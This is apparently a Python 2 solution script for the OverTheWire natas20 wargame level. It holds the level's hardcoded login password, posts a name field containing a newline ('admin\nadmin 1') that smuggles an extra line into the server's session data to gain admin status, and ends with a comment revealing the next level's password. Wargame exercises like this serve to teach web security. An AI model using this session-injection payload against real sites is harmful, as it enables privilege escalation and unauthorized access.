import requests
from string import *

user='natas20'
password='eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
url='http://natas20.natas.labs.overthewire.org/?debug=true'

session=requests.Session()

response=session.post(url,data={"name" : "admin\nadmin 1"},auth=(user,password))
print response.text
print "="*80

response=session.get(url,auth=(user,password))
print response.text
print "="*80

#IFekPyrQXftziDEsUr3x21sYuahypdgJ
